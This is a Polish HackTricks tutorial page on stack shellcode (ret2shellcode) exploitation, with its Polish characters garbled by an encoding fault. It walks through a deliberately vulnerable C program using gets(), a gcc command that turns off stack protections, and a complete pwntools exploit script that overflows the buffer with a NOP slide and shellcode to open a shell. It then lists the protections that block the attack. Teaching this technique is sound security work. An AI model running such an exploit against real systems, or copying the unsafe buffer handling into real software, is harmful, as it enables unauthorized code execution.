# Kod Shellcode'u na Stosie

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Podstawowe Informacje

**Kod shellcode'u na stosie** to technika uÅ¼ywana w eksploatacji binarnej, gdzie atakujÄ…cy zapisuje shellcode do stosu podatnego programu, a nastÄ™pnie modyfikuje **WskaÅºnik Instrukcji (IP)** lub **Rozszerzony WskaÅºnik Instrukcji (EIP)**, aby wskazywaÅ‚ na lokalizacjÄ™ tego shellcode'u, co powoduje jego wykonanie. Jest to klasyczna metoda uÅ¼ywana do uzyskania nieautoryzowanego dostÄ™pu lub wykonania dowolnych poleceÅ„ na systemie docelowym. Oto rozbudowanie procesu, w tym prosty przykÅ‚ad w jÄ™zyku C i sposÃ³b napisania odpowiadajÄ…cego exploitu przy uÅ¼yciu Pythona z **pwntools**.

### PrzykÅ‚ad w jÄ™zyku C: Podatny Program

Zacznijmy od prostego przykÅ‚adu podatnego programu w jÄ™zyku C:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
Ten program jest podatny na przepeÅ‚nienie bufora z powodu uÅ¼ycia funkcji `gets()`.

### Kompilacja

Aby skompilowaÄ‡ ten program wyÅ‚Ä…czajÄ…c rÃ³Å¼ne zabezpieczenia (aby zasymulowaÄ‡ Å›rodowisko podatne na ataki), moÅ¼esz uÅ¼yÄ‡ poniÅ¼szej komendy:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-fno-stack-protector`: WyÅ‚Ä…cza ochronÄ™ stosu.
* `-z execstack`: Sprawia, Å¼e stos jest wykonywalny, co jest konieczne do wykonania shellcode przechowywanego na stosie.
* `-no-pie`: WyÅ‚Ä…cza wykonywalne pliki o pozycji niezaleÅ¼nej, uÅ‚atwiajÄ…c przewidywanie adresu pamiÄ™ci, w ktÃ³rym znajdzie siÄ™ nasz shellcode.
* `-m32`: Kompiluje program jako plik wykonywalny 32-bitowy, czÄ™sto uÅ¼ywany ze wzglÄ™du na prostotÄ™ w tworzeniu exploitÃ³w.

### Python Exploit z uÅ¼yciem Pwntools

Oto jak moÅ¼na napisaÄ‡ exploit w Pythonie, korzystajÄ…c z **pwntools**, aby przeprowadziÄ‡ atak **ret2shellcode**:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
Ten skrypt konstruuje Å‚adunek skÅ‚adajÄ…cy siÄ™ z **slajdu NOP**, **kodu powÅ‚oki**, a nastÄ™pnie nadpisuje **EIP** adresem wskazujÄ…cym na slajd NOP, zapewniajÄ…c wykonanie kodu powÅ‚oki.

**Slajd NOP** (`asm('nop')`) jest uÅ¼ywany do zwiÄ™kszenia szansy na "przesuniÄ™cie" wykonania do naszego kodu powÅ‚oki bez wzglÄ™du na dokÅ‚adny adres. Dostosuj argument `p32()` do adresu poczÄ…tkowego bufora plus przesuniÄ™cia, aby trafiÄ‡ na slajd NOP.

## Protections

* [**ASLR**](../common-binary-protections/aslr.md) **powinien byÄ‡ wyÅ‚Ä…czony**, aby adres byÅ‚ niezawodny podczas kolejnych wykonan lub adres, pod ktÃ³rym bÄ™dzie przechowywana funkcja, nie bÄ™dzie zawsze taki sam, i bÄ™dziesz potrzebowaÄ‡ wycieku, aby dowiedzieÄ‡ siÄ™, gdzie jest zaÅ‚adowana funkcja win.
* [**Kanarki stosu**](../common-binary-protections/stack-canaries.md) rÃ³wnieÅ¼ powinny byÄ‡ wyÅ‚Ä…czone, w przeciwnym razie skompromitowany adres powrotu EIP nie zostanie nigdy wykonany.
* [**NX**](../common-binary-protections/no-exec-nx.md) ochrona **stosu** uniemoÅ¼liwi wykonanie kodu powÅ‚oki wewnÄ…trz stosu, poniewaÅ¼ ta czÄ™Å›Ä‡ nie bÄ™dzie wykonawcza.

## Inne przykÅ‚ady

* [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
